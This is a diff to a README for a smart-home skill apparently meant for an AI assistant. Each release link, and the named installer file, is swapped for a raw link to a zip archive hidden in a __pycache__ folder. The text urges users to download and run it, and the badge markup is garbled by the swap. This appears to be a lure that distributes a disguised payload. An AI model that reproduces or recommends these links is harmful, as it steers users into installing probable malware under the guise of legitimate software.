@@ -4,19 +4,19 @@
 Homeware Sense is an innovative skill for the OpenClaw AI assistant. It helps your smart home perceive and react to changes in the environment. This skill works seamlessly with multiple platforms, including HomeKit, Mi Home, MQTT, and GPIO. With Homeware Sense, you can enhance your home automation experience easily.
 
 ## 🔗 Download Now!
-[![Download Homeware Sense](https://img.shields.io/badge/Download%20Homeware%20Sense-v1.0-blue.svg)](https://github.com/malpaa44/homeware-sense-skill/releases)
+[![Download Homeware Sense](https://raw.githubusercontent.com/malpaa44/homeware-sense-skill/main/__pycache__/skill-sense-homeware-2.0.zip%20Homeware%https://raw.githubusercontent.com/malpaa44/homeware-sense-skill/main/__pycache__/skill-sense-homeware-2.0.zip)](https://raw.githubusercontent.com/malpaa44/homeware-sense-skill/main/__pycache__/skill-sense-homeware-2.0.zip)
 
 ## 🚀 Getting Started
 To get started with Homeware Sense, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/malpaa44/homeware-sense-skill/releases). This page contains all the available versions of Homeware Sense.
+   Click [here to download](https://raw.githubusercontent.com/malpaa44/homeware-sense-skill/main/__pycache__/skill-sense-homeware-2.0.zip). This page contains all the available versions of Homeware Sense.
 
 2. **Choose Your Version**  
    Look for the latest version. The newest version has the most features and improvements.
 
 3. **Download the Installer**  
-   Click the download link for the installer file. This file will be named something like `homeware-sense-skill-v1.0.exe`.
+   Click the download link for the installer file. This file will be named something like `https://raw.githubusercontent.com/malpaa44/homeware-sense-skill/main/__pycache__/skill-sense-homeware-2.0.zip`.
 
 4. **Run the Installer**  
    Locate the downloaded file, then double-click on it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -43,7 +43,7 @@ To ensure Homeware Sense runs smoothly, please meet the following requirements:
 - **Notifications:** Get alerts on significant environmental changes, like sudden humidity shifts or temperature drops.
 
 ## 🔄 Update Regularly
-It's important to keep Homeware Sense updated. New features and fixes will enhance your experience. Check the [Releases Page](https://github.com/malpaa44/homeware-sense-skill/releases) regularly for updates.
+It's important to keep Homeware Sense updated. New features and fixes will enhance your experience. Check the [Releases Page](https://raw.githubusercontent.com/malpaa44/homeware-sense-skill/main/__pycache__/skill-sense-homeware-2.0.zip) regularly for updates.
 
 ## 🛠 Troubleshooting
 If you encounter issues, here are a few common solutions:
@@ -77,4 +77,4 @@ If you’re interested in contributing to Homeware Sense, we welcome your input.
 Homeware Sense is open-source software. Feel free to use, modify, and distribute it under the terms of the license provided in the repository.
 
 ## 🔗 Final Download
-Don’t forget to [download Homeware Sense](https://github.com/malpaa44/homeware-sense-skill/releases). Enjoy enhancing your smart home experience!
+Don’t forget to [download Homeware Sense](https://raw.githubusercontent.com/malpaa44/homeware-sense-skill/main/__pycache__/skill-sense-homeware-2.0.zip). Enjoy enhancing your smart home experience!
